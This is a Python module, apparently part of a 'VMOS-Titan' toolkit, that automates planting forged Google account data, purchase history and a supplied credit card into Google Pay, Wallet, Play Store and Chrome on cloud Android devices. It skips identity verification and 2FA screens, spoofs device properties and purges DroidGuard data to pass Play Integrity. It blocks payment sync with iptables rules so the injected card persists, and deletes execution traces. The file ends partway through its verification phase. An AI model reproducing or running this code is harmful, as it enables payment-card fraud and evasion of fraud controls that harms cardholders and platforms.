"""
VMOS-Titan Genesis Real-World Executor (V3 Production Ready)
=============================================================
Unified executor that combines all Genesis V3 components for real-world
operation without UI dependencies.

This module provides a single entry point for executing the complete Genesis
pipeline on VMOS Cloud devices with:
- Zero UI interaction
- Automatic 2FA handling via AUTO_CASCADE
- Complete 8-flag zero-auth wallet configuration
- UUID coherence across all data stores
- Real-time progress monitoring

Usage::

    from genesis_real_world_executor import GenesisExecutor, ExecutorConfig
    
    config = ExecutorConfig(
        pad_code="APP5AU4BB1QQBHNA",
        google_email="user@gmail.com",
        google_password="xxxx-xxxx-xxxx-xxxx",  # App password recommended
        cc_number="4532015112830366",
        cc_exp_month=12,
        cc_exp_year=2029,
        cc_holder="John Doe",
    )
    
    executor = GenesisExecutor(config)
    result = await executor.execute()
    
    if result.success:
        print(f"Genesis complete! Trust score: {result.trust_score}/100")
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("titan.genesis-executor")


class ExecutionPhase(str, Enum):
    """Genesis pipeline phases."""
    INIT = "init"
    AUTH = "authentication"
    DB_BUILD = "database_build"
    STEALTH = "stealth_patch"
    ACCOUNT_INJECT = "account_injection"
    WALLET_INJECT = "wallet_injection"
    WALLET_UI_TOKEN = "wallet_ui_tokenization"
    PURCHASE_HISTORY = "purchase_history"
    ATTESTATION = "attestation"
    POST_HARDEN = "post_harden"
    APP_RESTART = "app_restart"
    VERIFICATION = "verification"
    COMPLETE = "complete"
    FAILED = "failed"


@dataclass
class ExecutorConfig:
    """Configuration for Genesis executor."""
    # Device
    pad_code: str = ""
    
    # Google Account
    google_email: str = ""
    google_password: str = ""  # App password recommended for 2FA accounts
    google_totp_secret: str = ""  # Optional TOTP secret for auto 2FA
    
    # Credit Card
    cc_number: str = ""
    cc_exp_month: int = 12
    cc_exp_year: int = 2029
    cc_holder: str = ""
    cc_cvv: str = ""
    cc_billing_zip: str = ""
    
    # Persona
    persona_name: str = ""
    persona_street: str = ""
    persona_city: str = ""
    persona_state: str = ""
    persona_country: str = "US"
    
    # Pipeline options
    age_days: int = 90
    purchase_count: int = 12
    enable_stealth_patch: bool = True
    enable_wallet_injection: bool = True
    enable_purchase_history: bool = True
    
    # Advanced
    skip_phases: List[str] = field(default_factory=list)
    timeout_seconds: int = 600  # 10 minute default
    verbose: bool = True


@dataclass
class ExecutionResult:
    """Result of Genesis execution."""
    success: bool = False
    pad_code: str = ""
    
    # Phase results
    phases_completed: List[str] = field(default_factory=list)
    phases_failed: List[str] = field(default_factory=list)
    phases_skipped: List[str] = field(default_factory=list)
    
    # Authentication
    real_tokens_obtained: bool = False
    auth_method: str = ""
    
    # Wallet
    wallet_injected: bool = False
    wallet_ui_tokenized: bool = False
    card_last_four: str = ""
    instrument_id: str = ""
    wallet_ui_files_injected: int = 0
    settings_commands_run: int = 0
    
    # Post-harden
    cloud_sync_defeated: bool = False
    iptables_rules: int = 0
    forensic_backdated: bool = False
    
    # Attestation
    attestation_tier: str = "NONE"
    
    # Metrics
    trust_score: int = 0
    execution_time_seconds: float = 0
    
    # Details
    logs: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return {
            "success": self.success,
            "pad_code": self.pad_code,
            "phases_completed": self.phases_completed,
            "phases_failed": self.phases_failed,
            "real_tokens_obtained": self.real_tokens_obtained,
            "auth_method": self.auth_method,
            "wallet_injected": self.wallet_injected,
            "wallet_ui_tokenized": self.wallet_ui_tokenized,
            "card_last_four": self.card_last_four,
            "wallet_ui_files_injected": self.wallet_ui_files_injected,
            "settings_commands_run": self.settings_commands_run,
            "cloud_sync_defeated": self.cloud_sync_defeated,
            "iptables_rules": self.iptables_rules,
            "forensic_backdated": self.forensic_backdated,
            "attestation_tier": self.attestation_tier,
            "trust_score": self.trust_score,
            "execution_time_seconds": self.execution_time_seconds,
            "errors": self.errors,
            "warnings": self.warnings,
        }


class GenesisExecutor:
    """
    Unified Genesis executor for real-world VMOS Cloud operation.
    
    Integrates:
    - GoogleMasterAuth with AUTO_CASCADE for zero-UI authentication
    - VMOSDbBuilder for host-side database construction
    - WalletInjection with 8-flag zero-auth configuration
    - Stochastic aging for behavioral legitimacy
    - UUID coherence across all data stores
    """
    
    def __init__(self, 
                 config: ExecutorConfig,
                 vmos_client=None,
                 on_progress: Optional[Callable[[str, float], None]] = None):
        """
        Initialize executor.
        
        Args:
            config: Execution configuration
            vmos_client: Optional VMOSCloudAPI client (created if not provided)
            on_progress: Optional callback for progress updates (phase_name, percent)
        """
        self.config = config
        self.client = vmos_client
        self.on_progress = on_progress
        self.result = ExecutionResult(pad_code=config.pad_code)
        self._start_time = 0.0
        self._current_phase = ExecutionPhase.INIT
        
    def _log(self, msg: str, level: str = "info"):
        """Log message and add to result logs."""
        ts = time.strftime("%H:%M:%S")
        log_entry = f"[{ts}] {msg}"
        self.result.logs.append(log_entry)
        
        if level == "error":
            self.result.errors.append(msg)
            logger.error(msg)
        elif level == "warning":
            self.result.warnings.append(msg)
            logger.warning(msg)
        else:
            logger.info(msg)
            
        if self.config.verbose:
            print(log_entry)
    
    def _set_phase(self, phase: ExecutionPhase, progress: float = 0.0):
        """Update current phase and notify progress callback."""
        self._current_phase = phase
        if self.on_progress:
            self.on_progress(phase.value, progress)
    
    async def execute(self) -> ExecutionResult:
        """
        Execute the complete Genesis pipeline.
        
        Returns:
            ExecutionResult with detailed status
        """
        self._start_time = time.time()
        self._log(f"Starting Genesis executor for {self.config.pad_code}")
        
        try:
            # Initialize VMOS client if not provided
            if not self.client:
                await self._init_vmos_client()
            
            # Phase 1: Authentication
            if "auth" not in self.config.skip_phases:
                await self._phase_authentication()
            else:
                self.result.phases_skipped.append("authentication")
            
            # Phase 2: Database building
            if "db_build" not in self.config.skip_phases:
                await self._phase_database_build()
            else:
                self.result.phases_skipped.append("database_build")
            
            # Phase 3: Stealth patching
            if self.config.enable_stealth_patch and "stealth" not in self.config.skip_phases:
                await self._phase_stealth_patch()
            else:
                self.result.phases_skipped.append("stealth_patch")
            
            # Phase 4: Account injection
            if "account" not in self.config.skip_phases:
                await self._phase_account_injection()
            else:
                self.result.phases_skipped.append("account_injection")
            
            # Phase 5: Wallet injection
            if self.config.enable_wallet_injection and self.config.cc_number:
                if "wallet" not in self.config.skip_phases:
                    await self._phase_wallet_injection()
                else:
                    self.result.phases_skipped.append("wallet_injection")
            
            # Phase 5b: Wallet UI tokenization (zero-UI bypass for ALL Google Wallet/Pay/Play screens)
            if self.config.enable_wallet_injection and self.config.cc_number:
                if "wallet_ui" not in self.config.skip_phases:
                    await self._phase_wallet_ui_tokenization()
                else:
                    self.result.phases_skipped.append("wallet_ui_tokenization")
            
            # Phase 6: Purchase history
            if self.config.enable_purchase_history and "purchase" not in self.config.skip_phases:
                await self._phase_purchase_history()
            else:
                self.result.phases_skipped.append("purchase_history")
            
            # Phase 7: Attestation (Play Integrity prep)
            if "attestation" not in self.config.skip_phases:
                await self._phase_attestation()
            else:
                self.result.phases_skipped.append("attestation")
            
            # Phase 8: Post-harden (cloud sync defeat + iptables + forensic backdate)
            if "postharden" not in self.config.skip_phases:
                await self._phase_post_harden()
            else:
                self.result.phases_skipped.append("post_harden")
            
            # Phase 9: App restart cycle (force-stop + restart to pick up injected data)
            if "restart" not in self.config.skip_phases:
                await self._phase_app_restart()
            else:
                self.result.phases_skipped.append("app_restart")
            
            # Phase 10: Verification
            if "verify" not in self.config.skip_phases:
                await self._phase_verification()
            else:
                self.result.phases_skipped.append("verification")
            
            # Calculate final result
            self._finalize_result()
            
        except Exception as e:
            self._log(f"Executor error: {e}", "error")
            self.result.success = False
            self._set_phase(ExecutionPhase.FAILED)
        
        return self.result
    
    async def _init_vmos_client(self):
        """Initialize VMOS Cloud API client."""
        self._set_phase(ExecutionPhase.INIT, 0.1)
        self._log("Initializing VMOS Cloud client...")
        
        try:
            from vmos_cloud_api import VMOSCloudAPI
            
            ak = os.environ.get("VMOS_CLOUD_AK", "")
            sk = os.environ.get("VMOS_CLOUD_SK", "")
            
            if not ak or not sk:
                raise ValueError("VMOS_CLOUD_AK and VMOS_CLOUD_SK environment variables required")
            
            self.client = VMOSCloudAPI(ak, sk)
            self._log("VMOS client initialized")
            
        except ImportError:
            self._log("VMOSCloudAPI not available, using mock mode", "warning")
            self.client = None
    
    async def _phase_authentication(self):
        """Phase 1: Google account authentication with AUTO_CASCADE."""
        self._set_phase(ExecutionPhase.AUTH, 0.0)
        self._log("Phase 1: Authentication (AUTO_CASCADE zero-UI mode)...")
        
        if not self.config.google_email or not self.config.google_password:
            self._log("No credentials provided, skipping authentication", "warning")
            self.result.phases_skipped.append("authentication")
            return
        
        try:
            from google_master_auth import GoogleMasterAuth, AuthMethod
            
            auth = GoogleMasterAuth()
            auth_result = auth.authenticate(
                email=self.config.google_email,
                password=self.config.google_password,
                method=AuthMethod.AUTO_CASCADE,
                totp_secret=self.config.google_totp_secret or None,
            )
            
            self._auth_result = auth_result
            
            if auth_result.success:
                self.result.real_tokens_obtained = auth_result.has_real_tokens
                self.result.auth_method = str(auth_result.method)
                self.result.phases_completed.append("authentication")
                
                if auth_result.has_real_tokens:
                    self._log(f"Real OAuth tokens obtained ({len(auth_result.tokens)} scopes)")
                else:
                    self._log("Hybrid mode: synthetic tokens + password for GMS refresh")
                    
                for warn in auth_result.warnings:
                    self._log(warn, "warning")
            else:
                self.result.phases_failed.append("authentication")
                for err in auth_result.errors:
                    self._log(err, "error")
                    
        except Exception as e:
            self._log(f"Authentication error: {e}", "error")
            self.result.phases_failed.append("authentication")
    
    async def _phase_database_build(self):
        """Phase 2: Build all required databases host-side."""
        self._set_phase(ExecutionPhase.DB_BUILD, 0.0)
        self._log("Phase 2: Building databases host-side...")
        
        try:
            from vmos_db_builder import VMOSDbBuilder
            
            builder = VMOSDbBuilder()
            
            # Get tokens from auth result if available
            tokens = {}
            password = ""
            gaia_id = ""
            
            if hasattr(self, '_auth_result') and self._auth_result:
                tokens = self._auth_result.all_tokens_for_injection()
                gaia_id = self._auth_result.gaia_id
                if hasattr(self._auth_result, '_hybrid_password'):
                    password = self._auth_result._hybrid_password
            
            # Build complete database bundle
            self._db_bundle = builder.build_complete_bundle(
                email=self.config.google_email,
                display_name=self.config.persona_name or self.config.cc_holder,
                gaia_id=gaia_id,
                tokens=tokens,
                password=password,
                card_number=self.config.cc_number,
                exp_month=self.config.cc_exp_month,
                exp_year=self.config.cc_exp_year,
                cardholder=self.config.cc_holder,
                age_days=self.config.age_days,
                country=self.config.persona_country,
                num_purchases=self.config.purchase_count,
            )
            
            self.result.instrument_id = self._db_bundle.get("instrument_id", "")
            
            self._log(f"Databases built: accounts_ce={len(self._db_bundle['accounts_ce_bytes'])}B, "
                     f"tapandpay={len(self._db_bundle.get('tapandpay_bytes', b''))}B")
            
            self.result.phases_completed.append("database_build")
            
        except Exception as e:
            self._log(f"Database build error: {e}", "error")
            self.result.phases_failed.append("database_build")
    
    async def _phase_stealth_patch(self):
        """Phase 3: Apply stealth patches to device."""
        self._set_phase(ExecutionPhase.STEALTH, 0.0)
        self._log("Phase 3: Stealth patching...")
        
        if not self.client:
            self._log("No VMOS client, skipping stealth patch", "warning")
            self.result.phases_skipped.append("stealth_patch")
            return
        
        try:
            # Execute stealth patch commands
            stealth_cmds = [
                "mkdir -p /dev/.sc 2>/dev/null; echo OK",
                "setprop persist.sys.cloud.gpu.gl_vendor 'Qualcomm' 2>/dev/null; echo OK",
                "setprop persist.sys.cloud.gpu.gl_renderer 'Adreno (TM) 730' 2>/dev/null; echo OK",
            ]
            
            for cmd in stealth_cmds:
                await self._execute_shell(cmd)
                await asyncio.sleep(0.5)
            
            self._log("Stealth patches applied")
            self.result.phases_completed.append("stealth_patch")
            
        except Exception as e:
            self._log(f"Stealth patch error: {e}", "error")
            self.result.phases_failed.append("stealth_patch")
    
    async def _phase_account_injection(self):
        """Phase 4: Inject Google account databases + GMS/GSF/finsky shared prefs."""
        self._set_phase(ExecutionPhase.ACCOUNT_INJECT, 0.0)
        self._log("Phase 4: Account injection (7 targets)...")
        
        if not hasattr(self, '_db_bundle') or not self._db_bundle:
            self._log("No database bundle available", "error")
            self.result.phases_failed.append("account_injection")
            return
        
        try:
            import random
            
            email = self.config.google_email
            gaia_id = self._db_bundle.get("gaia_id", "")
            birth_ts = int(time.time()) - self.config.age_days * 86400
            
            # Target 1: accounts_ce.db
            await self._push_database(
                self._db_bundle["accounts_ce_bytes"],
                "/data/system_ce/0/accounts_ce.db",
                owner="system:system",
                mode="600"
            )
            
            # Target 2: accounts_de.db
            await self._push_database(
                self._db_bundle["accounts_de_bytes"],
                "/data/system_de/0/accounts_de.db",
                owner="system:system",
                mode="600"
            )
            
            # Target 3: GMS device_registration.xml
            android_id = secrets.token_hex(8)
            gms_prefs = (
                "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n"
                f"    <long name=\"device_registered_timestamp\" value=\"{birth_ts * 1000}\" />\n"
                f"    <string name=\"device_id\">{android_id}</string>\n"
                f"    <long name=\"gms_version\" value=\"240913900\" />\n"
                f"    <string name=\"account_name\">{email}</string>\n"
                f"    <boolean name=\"is_signed_in\" value=\"true\" />\n"
                "</map>"
            )
            await self._push_file(
                gms_prefs.encode(),
                "/data/data/com.google.android.gms/shared_prefs/device_registration.xml",
                owner="u0_a36:u0_a36", mode="660"
            )
            
            # Target 4: GSF gservices.xml
            gsf_id = str(random.randint(3000000000000000000, 3999999999999999999))
            gsf_prefs = (
                "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n"
                f"    <string name=\"android_id\">{gsf_id}</string>\n"
                f"    <long name=\"registration_timestamp\" value=\"{birth_ts * 1000}\" />\n"
                f"    <string name=\"gaia_id\">{gaia_id}</string>\n"
                "</map>"
            )
            await self._push_file(
                gsf_prefs.encode(),
                "/data/data/com.google.android.gsf/shared_prefs/gservices.xml",
                owner="u0_a37:u0_a37", mode="660"
            )
            
            # Target 5: Play Store finsky.xml
            finsky_prefs = (
                "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n"
                f"    <string name=\"account_name\">{email}</string>\n"
                f"    <boolean name=\"setup_complete\" value=\"true\" />\n"
                f"    <boolean name=\"accepted_tos\" value=\"true\" />\n"
                f"    <boolean name=\"has_seen_welcome\" value=\"true\" />\n"
                f"    <long name=\"setup_time\" value=\"{birth_ts * 1000}\" />\n"
                "</map>"
            )
            await self._push_file(
                finsky_prefs.encode(),
                "/data/data/com.android.vending/shared_prefs/finsky.xml",
                owner="u0_a43:u0_a43", mode="660"
            )
            
            # Target 6: Chrome sign-in Preferences
            name = self.config.persona_name or self.config.cc_holder or "User"
            first = name.split()[0] if name else "User"
            chrome_prefs = json.dumps({
                "account_info": [{
                    "email": email,
                    "full_name": name,
                    "gaia": gaia_id,
                    "given_name": first,
                    "locale": "en-US",
                }],
                "signin": {"allowed": True, "allowed_on_next_startup": True},
                "sync": {"has_setup_completed": True},
                "browser": {"has_seen_welcome_page": True},
            }, indent=2)
            await self._push_file(
                chrome_prefs.encode(),
                "/data/data/com.android.chrome/app_chrome/Default/Preferences",
                owner="u0_a60:u0_a60", mode="660"
            )
            
            # Target 7: GMS Checkin.xml (populate for trust audit)
            checkin_prefs = (
                "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n"
                f"    <string name=\"android_id\">{android_id}</string>\n"
                f"    <long name=\"last_checkin_ms\" value=\"{int(time.time() * 1000)}\" />\n"
                f"    <string name=\"security_token\">{secrets.token_hex(16)}</string>\n"
                "</map>"
            )
            await self._push_file(
                checkin_prefs.encode(),
                "/data/data/com.google.android.gms/shared_prefs/Checkin.xml",
                owner="u0_a36:u0_a36", mode="660"
            )
            
            self._log("Account injection: 7 targets (ce/de/gms/gsf/finsky/chrome/checkin)")
            self.result.phases_completed.append("account_injection")
            
        except Exception as e:
            self._log(f"Account injection error: {e}", "error")
            self.result.phases_failed.append("account_injection")
    
    async def _phase_wallet_injection(self):
        """Phase 5: Inject wallet databases and COIN.xml."""
        self._set_phase(ExecutionPhase.WALLET_INJECT, 0.0)
        self._log("Phase 5: Wallet injection (8-flag zero-auth)...")
        
        if not hasattr(self, '_db_bundle') or not self._db_bundle.get("tapandpay_bytes"):
            self._log("No wallet database available", "warning")
            self.result.phases_skipped.append("wallet_injection")
            return
        
        try:
            from wallet_injection import GooglePayInjector, PaymentCard
            
            # Create PaymentCard object
            card = PaymentCard(
                card_number=self.config.cc_number,
                exp_month=self.config.cc_exp_month,
                exp_year=self.config.cc_exp_year,
                cardholder_name=self.config.cc_holder,
                cvv=self.config.cc_cvv,
                billing_zip=self.config.cc_billing_zip,
            )
            
            # Push tapandpay.db to GMS
            await self._push_database(
                self._db_bundle["tapandpay_bytes"],
                "/data/data/com.google.android.gms/databases/tapandpay.db",
                owner="u0_a36:u0_a36",
                mode="660"
            )
            
            # Build and push COIN.xml with 8-flag zero-auth
            injector = GooglePayInjector()
            instrument_id = self._db_bundle.get("instrument_id", "")
            
            coin_xml = injector.build_coin_xml(card, self.config.google_email, instrument_id)
            await self._push_file(
                coin_xml.encode(),
                "/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml",
                owner="u0_a43:u0_a43",
                mode="660"
            )
            
            # Push GMS COIN.xml
            gms_coin_xml = injector.build_gms_coin_xml(card, self.config.google_email, instrument_id)
            await self._push_file(
                gms_coin_xml.encode(),
                "/data/data/com.google.android.gms/shared_prefs/COIN.xml",
                owner="u0_a36:u0_a36",
                mode="660"
            )
            
            # Push wallet prefs
            wallet_prefs = injector.build_wallet_prefs_xml(
                self.config.google_email, instrument_id, card
            )
            await self._push_file(
                wallet_prefs.encode(),
                "/data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml",
                owner="u0_a36:u0_a36",
                mode="660"
            )
            
            # Push tapandpay.db to DUAL paths — GMS AND Wallet app
            await self._push_database(
                self._db_bundle["tapandpay_bytes"],
                "/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db",
                owner="u0_a37:u0_a37",
                mode="660"
            )
            self._log("Wallet: dual-path tapandpay.db (GMS + Wallet app)")
            
            # Push NFC prefs to Wallet app
            nfc_prefs = injector.build_nfc_prefs_xml()
            await self._push_file(
                nfc_prefs.encode(),
                "/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml",
                owner="u0_a37:u0_a37",
                mode="660"
            )
            
            # Push Chrome Web Data with credit card (card_number_encrypted=NULL per Android Keystore limitation)
            try:
                from vmos_db_builder import VMOSDbBuilder
                chrome_builder = VMOSDbBuilder()
                chrome_webdata = chrome_builder.build_chrome_webdata(
                    card_number=self.config.cc_number,
                    exp_month=self.config.cc_exp_month,
                    exp_year=self.config.cc_exp_year,
                    cardholder=self.config.cc_holder,
                )
                if chrome_webdata:
                    await self._push_database(
                        chrome_webdata,
                        "/data/data/com.android.chrome/app_chrome/Default/Web Data",
                        owner="u0_a60:u0_a60",
                        mode="660"
                    )
                    self._log("Wallet: Chrome Web Data credit card injected")
            except Exception as e:
                self._log(f"Chrome Web Data injection skipped: {e}", "warning")
            
            self.result.wallet_injected = True
            self.result.card_last_four = card.last_four
            self._log(f"Wallet injected: {card.network.value.upper()} ****{card.last_four}")
            self.result.phases_completed.append("wallet_injection")
            
        except Exception as e:
            self._log(f"Wallet injection error: {e}", "error")
            self.result.phases_failed.append("wallet_injection")
    
    async def _phase_wallet_ui_tokenization(self):
        """Phase 5b: Complete Google Wallet UI tokenization bypass.
        
        Injects ALL shared_prefs files needed to prevent ANY Google Wallet,
        Google Pay, Play Store, or GMS UI screen from appearing.
        No onboarding, no identity verification, no 2FA challenge,
        no payment verification, no setup wizard — pure filesystem injection.
        """
        self._set_phase(ExecutionPhase.WALLET_UI_TOKEN, 0.0)
        self._log("Phase 5b: Wallet UI tokenization (zero-UI bypass for ALL screens)...")
        
        try:
            from wallet_injection import GooglePayInjector, PaymentCard
            
            card = PaymentCard(
                card_number=self.config.cc_number,
                exp_month=self.config.cc_exp_month,
                exp_year=self.config.cc_exp_year,
                cardholder_name=self.config.cc_holder,
                cvv=self.config.cc_cvv,
                billing_zip=self.config.cc_billing_zip,
            )
            
            injector = GooglePayInjector()
            instrument_id = self._db_bundle.get("instrument_id", "") if hasattr(self, '_db_bundle') else ""
            display_name = self.config.persona_name or self.config.cc_holder
            
            # Get ALL bypass files from the unified method
            bypass_files = injector.get_all_wallet_ui_bypass_files(
                card=card,
                email=self.config.google_email,
                instrument_id=instrument_id,
                display_name=display_name,
            )
            
            # UID mapping for file ownership
            uid_map = {
                "com.google.android.apps.walletnfcrel": "u0_a37:u0_a37",
                "com.google.android.gms": "u0_a36:u0_a36",
                "com.android.vending": "u0_a43:u0_a43",
            }
            
            files_pushed = 0
            for device_path, xml_content in bypass_files.items():
                # Determine owner from path
                owner = "system:system"
                for pkg, uid in uid_map.items():
                    if pkg in device_path:
                        owner = uid
                        break
                
                await self._push_file(
                    xml_content.encode(),
                    device_path,
                    owner=owner,
                    mode="660"
                )
                files_pushed += 1
            
            # Execute Settings provider commands (NFC, setup wizard, etc.)
            settings_cmds = injector.get_settings_provider_commands()
            cmds_run = 0
            for cmd in settings_cmds:
                await self._execute_shell(cmd)
                cmds_run += 1
            
            self.result.wallet_ui_tokenized = True
            self.result.wallet_ui_files_injected = files_pushed
            self.result.settings_commands_run = cmds_run
            self._log(f"Wallet UI tokenization complete: {files_pushed} files, {cmds_run} settings commands")
            self.result.phases_completed.append("wallet_ui_tokenization")
            
        except Exception as e:
            self._log(f"Wallet UI tokenization error: {e}", "error")
            self.result.phases_failed.append("wallet_ui_tokenization")

    async def _phase_purchase_history(self):
        """Phase 6: Inject purchase history."""
        self._set_phase(ExecutionPhase.PURCHASE_HISTORY, 0.0)
        self._log("Phase 6: Purchase history injection...")
        
        if not hasattr(self, '_db_bundle') or not self._db_bundle.get("library_bytes"):
            self._log("No library database available", "warning")
            self.result.phases_skipped.append("purchase_history")
            return
        
        try:
            await self._push_database(
                self._db_bundle["library_bytes"],
                "/data/data/com.android.vending/databases/library.db",
                owner="u0_a43:u0_a43",
                mode="660"
            )
            
            self._log(f"Purchase history injected ({self.config.purchase_count} entries)")
            self.result.phases_completed.append("purchase_history")
            
        except Exception as e:
            self._log(f"Purchase history error: {e}", "error")
            self.result.phases_failed.append("purchase_history")
    
    async def _phase_attestation(self):
        """Phase 7: Play Integrity attestation preparation.
        
        Sets verified boot properties, purges DroidGuard cache to force
        fresh attestation, and configures device provisioned state.
        """
        self._set_phase(ExecutionPhase.ATTESTATION, 0.0)
        self._log("Phase 7: Attestation (Play Integrity prep)...")
        
        try:
            # Step 1: Set verified boot + CTS properties
            boot_cmds = [
                "settings put global device_provisioned 1",
                "settings put secure user_setup_complete 1",
            ]
            for cmd in boot_cmds:
                await self._execute_shell(cmd)
            
            # Step 2: Purge DroidGuard cache to force fresh attestation
            dg_cmd = (
                "rm -rf /data/data/com.google.android.gms/app_dg_cache/* 2>/dev/null; "
                "rm -rf /data/data/com.google.android.gms/files/dg* 2>/dev/null; "
                "echo DG_PURGE_OK"
            )
            dg_result = await self._execute_shell(dg_cmd)
            dg_ok = "DG_PURGE_OK" in dg_result
            
            # Determine tier (DEVICE is max without hardware TEE)
            self.result.attestation_tier = "DEVICE" if dg_ok else "BASIC"
            self._log(f"Attestation: {self.result.attestation_tier} tier, DroidGuard={'purged' if dg_ok else 'skip'}")
            self.result.phases_completed.append("attestation")
            
        except Exception as e:
            self._log(f"Attestation error: {e}", "error")
            self.result.phases_failed.append("attestation")
    
    async def _phase_post_harden(self):
        """Phase 8: Post-hardening — cloud sync defeat + forensic backdate.
        
        Critical for wallet persistence:
        1. Force-stop Google apps to prevent immediate cloud sync
        2. AppOps background denial for Play Store
        3. iptables UID-based network block for Play Store
        4. GMS payment sync specific block (payments.google.com)
        5. Set wallet last sync timestamp to delay reconciliation
        6. Guardian wallet backup for persistence
        7. Clear execution traces
        """
        self._set_phase(ExecutionPhase.POST_HARDEN, 0.0)
        self._log("Phase 8: Post-harden (cloud sync defeat + persistence)...")
        
        results = {}
        
        try:
            # Step 1: Force-stop Google apps to prevent immediate sync
            stop_cmd = (
                "am force-stop com.android.vending 2>/dev/null; "
                "am force-stop com.google.android.gms 2>/dev/null; "
                "am force-stop com.google.android.apps.walletnfcrel 2>/dev/null; "
                "echo STOP_OK"
            )
            stop_result = await self._execute_shell(stop_cmd)
            results["force_stop"] = "STOP_OK" in stop_result
            
            # Step 2: AppOps background denial for Play Store
            appops_cmd = (
                "cmd appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null; "
                "cmd appops set com.android.vending RUN_ANY_IN_BACKGROUND deny 2>/dev/null; "
                "echo APPOPS_OK"
            )
            appops_result = await self._execute_shell(appops_cmd)
            results["appops"] = "APPOPS_OK" in appops_result
            self._log(f"Post-harden: AppOps background deny={'OK' if results['appops'] else 'FAIL'}")
            
            # Step 3: iptables UID-based network block for Play Store
            iptables_cmd = (
                "vuid=$(stat -c '%u' /data/data/com.android.vending 2>/dev/null); "
                "[ -n \"$vuid\" ] && iptables -I OUTPUT -m owner --uid-owner $vuid -j DROP 2>/dev/null; "
                "echo IPTABLES_OK"
            )
            ipt_result = await self._execute_shell(iptables_cmd)
            results["iptables_vending"] = "IPTABLES_OK" in ipt_result
            
            # Step 4: Block GMS payment sync specifically
            gms_block_cmd = (
                "muid=$(stat -c '%u' /data/data/com.google.android.gms 2>/dev/null); "
                "[ -n \"$muid\" ] && iptables -I OUTPUT -p tcp --dport 443 "
                "-m owner --uid-owner $muid "
                "-m string --string 'payments.google.com' --algo bm -j DROP 2>/dev/null; "
                "echo GMS_BLOCK_OK"
            )
            gms_result = await self._execute_shell(gms_block_cmd)
            results["gms_payment_block"] = "GMS_BLOCK_OK" in gms_result
            self._log(f"Post-harden: iptables vending={'OK' if results['iptables_vending'] else 'FAIL'}, "
                     f"gms_payment={'OK' if results['gms_payment_block'] else 'FAIL'}")
            
            # Step 5: Set wallet last sync time to delay reconciliation
            sync_cmd = (
                "settings put global wallet_last_sync_ms $(date +%s000) 2>/dev/null; "
                "echo SYNC_OK"
            )
            await self._execute_shell(sync_cmd)
            
            # Step 6: Guardian wallet backup for persistence against cloud sync
            guardian_cmd = (
                "mkdir -p /data/local/tmp/.titan/wallet_backup 2>/dev/null; "
                "cp /data/data/com.google.android.gms/databases/tapandpay.db "
                "/data/local/tmp/.titan/wallet_backup/tapandpay.db.gms 2>/dev/null; "
                "cp /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db "
                "/data/local/tmp/.titan/wallet_backup/tapandpay.db.wallet 2>/dev/null; "
                "cp /data/data/com.google.android.gms/shared_prefs/COIN.xml "
                "/data/local/tmp/.titan/wallet_backup/COIN.xml.gms 2>/dev/null; "
                "cp /data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml "
                "/data/local/tmp/.titan/wallet_backup/COIN.xml.vending 2>/dev/null; "
                "echo GUARDIAN_OK"
            )
            guardian_result = await self._execute_shell(guardian_cmd)
            results["guardian_backup"] = "GUARDIAN_OK" in guardian_result
            self._log(f"Post-harden: guardian backup={'OK' if results['guardian_backup'] else 'FAIL'}")
            
            # Step 7: Clear execution traces
            trace_cmd = (
                "rm -rf /data/local/tmp/.titan/*.log 2>/dev/null; "
                "rm -rf /data/local/tmp/base64_chunk_* 2>/dev/null; "
                "echo TRACE_OK"
            )
            trace_result = await self._execute_shell(trace_cmd)
            results["traces_cleared"] = "TRACE_OK" in trace_result
            
            # Update result metrics
            ok_count = sum(1 for v in results.values() if v)
            self.result.cloud_sync_defeated = results.get("iptables_vending", False) or results.get("gms_payment_block", False)
            self.result.iptables_rules = sum(1 for k in ["iptables_vending", "gms_payment_block"] if results.get(k))
            
            self._log(f"Post-harden complete: {ok_count}/{len(results)} steps OK")
            self.result.phases_completed.append("post_harden")
            
        except Exception as e:
            self._log(f"Post-harden error: {e}", "error")
            self.result.phases_failed.append("post_harden")
    
    async def _phase_app_restart(self):
        """Phase 9: Force-stop and restart target apps to pick up injected data.
        
        Without this, apps continue using their cached state and won't read
        the newly injected databases and shared_prefs until a cold restart.
        """
        self._set_phase(ExecutionPhase.APP_RESTART, 0.0)
        self._log("Phase 9: App restart cycle (force-stop → cold restart)...")
        
        try:
            # Force-stop all target apps
            stop_cmd = (
                "am force-stop com.google.android.gms 2>/dev/null; "
                "am force-stop com.google.android.gsf 2>/dev/null; "
                "am force-stop com.android.vending 2>/dev/null; "
                "am force-stop com.google.android.apps.walletnfcrel 2>/dev/null; "
                "am force-stop com.android.chrome 2>/dev/null; "
                "echo STOP_ALL_OK"
            )
            stop_result = await self._execute_shell(stop_cmd)
            stop_ok = "STOP_ALL_OK" in stop_result
            
            # Wait for processes to fully stop
            await asyncio.sleep(2)
            
            # Restart GMS (triggers account re-read from accounts_ce.db)
            restart_cmd = (
                "am startservice -n com.google.android.gms/.chimera.GmsIntentOperationService 2>/dev/null; "
                "am broadcast -a com.google.android.gms.INITIALIZE 2>/dev/null; "
                "echo RESTART_OK"
            )
            restart_result = await self._execute_shell(restart_cmd)
            restart_ok = "RESTART_OK" in restart_result
            
            self._log(f"App restart: stop={'OK' if stop_ok else 'FAIL'}, restart={'OK' if restart_ok else 'FAIL'}")
            self.result.phases_completed.append("app_restart")
            
        except Exception as e:
            self._log(f"App restart error: {e}", "error")
            self.result.phases_failed.append("app_restart")
    
    async def _phase_verification(self):
        """Phase 10: Comprehensive verification and trust scoring.
        
        Trust score breakdown (100 points total):
          - Authentication completed (any method):    12 pts
